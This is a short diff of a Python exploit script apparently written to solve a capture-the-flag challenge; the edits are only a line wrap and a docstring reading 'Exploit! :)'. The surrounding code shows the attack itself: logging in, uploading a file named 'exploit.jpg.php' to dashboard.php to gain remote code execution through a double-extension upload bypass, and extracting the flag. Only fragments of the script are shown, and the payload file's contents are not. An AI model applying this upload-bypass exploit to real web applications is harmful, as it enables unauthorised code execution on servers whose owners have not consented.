@@ -27,7 +27,8 @@ def upload_rce():
     """
     url = f"{APP_ROOT}/dashboard.php"
     with open("exploit.jpg.php", "rb") as file:
-        files = {"fileUploaded": ("exploit.jpg.php", file, "application/octet-stream")}
+        files = {"fileUploaded": (
+            "exploit.jpg.php", file, "application/octet-stream")}
         response = session.post(url, files=files, allow_redirects=True)
         return response.text
 
@@ -47,6 +48,9 @@ def get_flag(upload_res):
 
 
 def main():
+    """
+    Exploit! :)
+    """
     login()
     upload_res = upload_rce()
     print(f"Flag: DANTE{{{get_flag(upload_res)}}}")
